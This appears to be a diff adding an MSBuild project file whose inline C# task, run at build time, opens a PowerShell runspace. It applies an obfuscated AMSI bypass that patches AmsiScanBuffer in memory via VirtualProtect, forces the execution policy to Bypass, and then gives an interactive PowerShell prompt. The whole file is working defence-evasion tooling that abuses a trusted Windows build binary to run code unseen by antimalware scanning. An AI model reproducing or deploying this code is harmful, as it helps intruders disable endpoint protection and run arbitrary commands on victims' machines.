@@ -1,0 +1,197 @@
+<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="4.0">
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Net" />
+    <Reference Include="System.Xml" />
+    <Reference Include="System.Management.Automation" />
+  </ItemGroup>
+
+  <Target Name="Hello">
+    <ClassExample />
+  </Target>
+
+  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Using Namespace="System" />
+      <Using Namespace="System.Reflection" />
+      <Using Namespace="System.Diagnostics" />
+      <Using Namespace="System.Net" />
+      <Using Namespace="System.IO" />
+      <Using Namespace="System.Management.Automation" />
+      <Reference Include="System.Management.Automation" />
+      
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+using System;
+using System.IO;
+using System.Collections.ObjectModel;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Threading;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+
+public class ClassExample : Task
+{
+    public override bool Execute()
+    {
+        Thread x1 = new Thread(RunPowerShell);
+        x1.Start();
+        x1.Join();
+        return true;
+    }
+
+    private void RunPowerShell()
+    {
+        Runspace x2 = RunspaceFactory.CreateRunspace();
+        x2.Open();
+        PowerShell y1 = PowerShell.Create();
+        y1.Runspace = x2;
+        string y2 = Directory.GetCurrentDirectory();
+
+        Console.WriteLine("PS " + y2 + ">");
+
+        // Obfuscated AMSI bypass
+        string amsiBypass = @"
+            $x1 = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.EndsWith(('Sys' + 'tem.dll')) }
+            $y2 = $x1.GetType(('Micro' + 'soft.Win' + '32.Unsafe' + 'NativeMethods'))
+            $z3 = $y2.GetMethods() | Where-Object { $_.Name -cmatch ('^Ge' + '.*P.*oc.*' + 'ddress$') }
+            $w4 = $y2.GetMethod(('Get' + 'Module' + 'Handle'))
+            $v5 = $w4.Invoke($null, @(('am' + 'si.d' + 'll')))
+            $u6 = $z3[0].Invoke($null, @($v5, ('Ams' + 'iScan' + 'Buffer')))
+            $t7 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName(('Ref' + 'lected' + 'Delegate'))), [Reflection.Emit.AssemblyBuilderAccess]::Run)
+            $s8 = $t7.DefineDynamicModule(('InMem' + 'oryMod' + 'ule'), $false)
+            $r9 = @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType())
+            $q10 = [Bool]
+            $p11 = $s8.DefineType(('MyDel' + 'egate' + 'Type'), ('Class' + ',Public,Sealed,AnsiClass,AutoClass'), [MulticastDelegate])
+            $o12 = $p11.DefineConstructor(('RTSpe' + 'cialName,HideBySig,Public'), [Reflection.CallingConventions]::Standard, $r9)
+            $o12.SetImplementationFlags(('Run' + 'time,Managed'))
+            $n13 = $p11.DefineMethod(('Invo' + 'ke'), ('Public,Hide' + 'BySig,NewSlot,Virtual'), $q10, $r9)
+            $n13.SetImplementationFlags(('Run' + 'time,Managed'))
+            $m14 = $p11.CreateType()
+            $l15 = $w4.Invoke($null, @(('kern' + 'el32.d' + 'll')))
+            $k16 = $z3[0].Invoke($null, @($l15, ('Virt' + 'ualPro' + 'tect')))
+            $j17 = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($k16, $m14)
+            $i18 = 0
+            $h19 = $j17.Invoke($u6, 3, 0x40, [ref]$i18)
+            Start-Sleep 1
+            [Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8, 0x00, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3), 0, $u6, 12)
+        ";
+
+        // Execute AMSI bypass
+        try
+        {
+            y1.AddScript(amsiBypass);
+            y1.Invoke();
+            y1.Commands.Clear();
+            Console.WriteLine("AMSI bypass applied successfully.");
+        }
+        catch (Exception e)
+        {
+            Console.WriteLine(e.Message);
+            x2.Close();
+            return;
+        }
+
+        // Set execution policy to Bypass
+        try
+        {
+            y1.AddScript("Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force");
+            y1.Invoke();
+            y1.Commands.Clear();
+            Console.WriteLine("Execution policy set to Bypass.");
+        }
+        catch (Exception e)
+        {
+            Console.WriteLine(e.Message);
+            x2.Close();
+            return;
+        }
+
+        // Interactive PowerShell loop
+        while (true)
+        {
+            Console.Write("PS " + y2 + "> ");
+            string cmd = Console.ReadLine();
+
+            if (string.IsNullOrWhiteSpace(cmd)) continue;
+
+            try
+            {
+                // Handle 'exit' command
+                if (cmd.Trim().ToLower() == "exit")
+                {
+                    Console.WriteLine("Exiting PowerShell session...");
+                    break;
+                }
+
+                // Handle directory navigation
+                if (cmd.StartsWith("cd ") || cmd.StartsWith("Set-Location"))
+                {
+                    string targetPath = cmd.Substring(cmd.IndexOf(" ") + 1).Trim().Replace("\"", "");
+                    if (Directory.Exists(targetPath))
+                    {
+                        Directory.SetCurrentDirectory(targetPath);
+                        y2 = Directory.GetCurrentDirectory();
+                        y1.AddScript("Set-Location \"" + y2 + "\"").Invoke();
+                        y1.Commands.Clear();
+                    }
+                    else
+                    {
+                        Console.WriteLine("The system cannot find the path specified: " + targetPath);
+                    }
+                    continue;
+                }
+
+                // Execute the command and capture output
+                y1.AddScript(cmd + " | Out-String");
+                Collection<PSObject> psOutput = y1.Invoke();
+                Collection<ErrorRecord> errors = y1.Streams.Error.ReadAll();
+
+                // Handle errors
+                if (errors.Count > 0)
+                {
+                    Console.WriteLine();
+                    foreach (ErrorRecord error in errors)
+                    {
+                        Console.WriteLine(error.ToString());
+                    }
+                }
+
+                // Display output
+                if (psOutput.Count > 0)
+                {
+                    Console.WriteLine();
+                    foreach (PSObject output in psOutput)
+                    {
+                        if (output != null)
+                        {
+                            Console.WriteLine(output.ToString());
+                        }
+                    }
+                }
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine();
+                Console.WriteLine(e.Message);
+            }
+            finally
+            {
+                y1.Commands.Clear();
+            }
+        }
+
+        x2.Close();
+    }
+}
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
